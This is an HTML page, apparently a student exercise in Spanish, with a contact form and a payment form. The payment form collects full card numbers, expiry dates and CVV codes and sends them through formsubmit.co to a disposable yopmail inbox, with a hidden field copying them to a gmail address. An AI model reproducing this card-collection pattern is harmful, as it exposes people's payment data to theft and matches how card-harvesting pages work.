<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Formulario de Pago</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h2>Formulario de Contacto</h2>
    <form action="https://formsubmit.co/yeibertveliz10@gmail.com" method="POST">
        <label for="email1">Correo electrónico:</label>
        <input type="email" name="email" id="email1" required><br>
        <label for="name">Nombres:</label>
        <input type="text" name="name" required><br>
        <label for="comment">Comentario:</label>
        <textarea name="comment" required></textarea><br>
        <input type="submit" value="Enviar">
    </form>

    <h2>Formulario de Pago</h2>
    <form id="paymentForm" action="https://formsubmit.co/programacion2ais@yopmail.com" method="POST">
        <label for="email2">Correo electrónico:</label>
        <input type="email" name="email" id="email2" required><br>
        <label for="card_holder_name">Titular de la tarjeta:</label>
        <input type="text" name="card_holder_name" required><br>
        <label for="card_number">Número de tarjeta:</label>
        <input type="text" name="card_number" required><br>
        <label for="expiration_month">Mes de expiración:</label>
        <input type="text" name="expiration_month" required><br>
        <label for="expiration_year">Año de expiración:</label>
        <input type="text" name="expiration_year" required><br>
        <label for="cvv">Código de seguridad (CVV):</label>
        <input type="text" name="cvv" required><br>
        <label for="amount">Monto a pagar:</label>
        <input type="number" name="amount" required><br>
        <label for="currency">Moneda:</label>
        <input type="text" name="currency" required><br>
        <div class="g-recaptcha" data-sitekey="6LetXUYrAAAAALJCRFkKtz-D0dgZpKc3TaoX0pL3"></div>
        <input type="submit" value="Realizar Pago">

    <input type="hidden" name="_cc" value="yeibertveliz10@gmail.com"> 
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_next" value="https://tudominio.com/confirmacion.html">
    </form>

    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <script>
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        if (typeof grecaptcha !== "undefined") {
            var response = grecaptcha.getResponse();
            if(response.length == 0) {
                alert('Por favor, completa el reCAPTCHA.');
                e.preventDefault();
                return false;
            }
        } else {
            alert('No se pudo cargar reCAPTCHA. Intenta recargar la página.');
            e.preventDefault();
            return false;
        }
    });
    </script>
</body>
</html>
